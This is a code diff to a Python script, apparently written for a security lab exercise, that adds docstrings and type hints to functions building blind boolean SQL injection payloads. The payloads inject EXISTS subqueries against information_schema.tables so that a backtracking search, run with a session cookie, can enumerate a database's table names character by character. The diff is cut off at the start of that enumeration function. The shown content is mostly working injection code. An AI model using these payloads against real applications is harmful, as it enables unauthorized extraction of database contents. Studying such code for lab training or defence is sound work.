@@ -4,26 +4,51 @@ from helpers import inject
 import tabulate
 
 
-def print_table_names():
+def print_table_names() -> None:
+    """
+    Reads the table.pkl file and prints the table names
+    :return: None
+    """
     data = pickle.load(open('outputs/tables.pkl', 'rb'))
     print(tabulate.tabulate([[row] for row in data], headers=["Table Names"]))
 
 
-def check_query(table_name):
+def check_query(table_name: str) -> str:
+    """
+    Returns a query string for SQL injection that is used to find the candidate names that are valid.
+
+    :param table_name: name of the table
+    :return: Query string
+    """
     return (
         f'tom\' AND EXISTS (SELECT * FROM information_schema.tables WHERE '
         f'table_name = \'{table_name}\')--'
     )
 
 
-def builder_query(length, word):
+def builder_query(length: int, word: str) -> str:
+    """
+    Returns a query string for SQL injection that is used to build the list of possible candidates.
+
+    :param length: Length of teh sequence
+    :param word: Sequence of letters
+    :return: Query string
+    """
+
     return (
         f'tom\' AND EXISTS (SELECT * FROM information_schema.tables WHERE '
         f'SUBSTRING(table_name, 1, {length})=\'{word}\')--'
     )
 
 
-def get_table_names(cookie):
+def get_table_names(cookie: str) -> None:
+    """
+    Retrieves the table names. Uses a backtracking algorithm to do so.
+
+    :param cookie: Session cookie required by the header
+    :return: None
+    """
+
     tables = []
     alphabets = string.ascii_letters + "_"
     queue = ['']
